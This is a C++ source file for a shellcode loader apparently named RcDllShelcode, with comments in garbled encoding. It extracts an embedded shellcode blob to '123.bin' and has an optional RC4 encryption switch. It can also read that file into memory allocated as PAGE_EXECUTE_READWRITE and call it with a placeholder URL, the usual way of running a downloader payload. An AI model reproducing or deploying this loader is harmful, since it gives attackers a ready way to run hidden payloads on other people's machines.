// RcDllShelcode.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<Windows.h>
#include"ShellCode.h"
#pragma warning(disable:4996)
//#pragma comment(linker, "/section:.data,RWE")   

DWORD ReadFileData(char *szFilePath, char *pBuf)
{
	DWORD dwBytesRead;
	HANDLE hFile;

	hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD dwFileSize = GetFileSize(hFile, 0);
	if (dwFileSize == 0)
	{
		CloseHandle(hFile);
		return 0;
	}

	ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL);
	CloseHandle(hFile);
	return dwFileSize;
}
DWORD GetFileSizeLen(char *szSource)
{

	HANDLE hFile;

	hFile = CreateFile(szSource, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "�ļ�δ�ҵ���", NULL, NULL);
		return 0;
	}

	DWORD dwFileSize = GetFileSize(hFile, 0);
	if (dwFileSize == 0)
	{
		MessageBoxA(NULL, "�ļ�����Ϊ�㣡", NULL, NULL);
		CloseHandle(hFile);
		return 0;
	}
	CloseHandle(hFile);
	return dwFileSize;
}


#ifndef RUNEXEMT
void RunShellCode()
{
	int dwShellCodeLen = (int)mmLoaderSCEnd - (int)mmLoaderSCStart;

	void* shellcodeEnter = mmLoaderSCStart;
	typedef void(WINAPI* fnFun)(
		char*
		);
	char URL[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
	fnFun Shellcode = (fnFun)(shellcodeEnter);
	Shellcode(URL);

}
#else

void RunShellCode()
{
	
	char shelname[] = "123.bin";

	DWORD filelen = GetFileSizeLen(shelname);
	char *filebuf = new char[filelen];
	ReadFileData(shelname, filebuf);

	char URL[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

	typedef void(WINAPI* fnFun)(
		char*
		);
	PVOID p = NULL;
	if ((p = VirtualAlloc(NULL, filelen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
		MessageBoxA(NULL, "�����ڴ�ʧ��", "����", MB_OK);
	if (!(memcpy(p, filebuf, filelen)))
		MessageBoxA(NULL, "д�ڴ�ʧ��", "����", MB_OK);
	fnFun Shellcode = (fnFun)p;
	Shellcode(URL);

}
#endif


/*
����Shelocde��д,��ȡ,����

Debugģʽ�£����Ա�д��shelcode�����Ƿ��������������

ReleaseģʽΪ��ȡshelcode����ȡ�����Ķ��ǿ���ֱ��call�Ļ�������

RUN_EXE_MT ����Ϊ���õ�exe
*/
#ifdef RUNEXEMT
/*
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
*/
int _tmain(int argc, _TCHAR* argv[])
{
	RunShellCode();
	return 0;
#else

int _tmain(int argc, _TCHAR* argv[])
{
	
#endif


#ifdef _DEBUG
	
	
	RunShellCode();
	
	return 0;
#else
//���üӽ��ܵĿ���
// #define RC4_EN

	//����
	int dwShellCodeLen = (int)mmLoaderSCEnd - (int)mmLoaderSCStart;

	void * shellcodeEnter =mmLoaderSCStart;


	//����shellcode�ļ�
	FILE *fp;
	fp = fopen("123.bin", "w+b");
	if (fp)
	{
#ifdef RC4_EN
		fwrite(shellcodeEnter, (dwShellCodeLen + sizeof(s_flag)*2), 1, fp);
#else
		fwrite(shellcodeEnter, dwShellCodeLen, 1, fp);
#endif
		fclose(fp);
	}

	return 0;
#endif
}

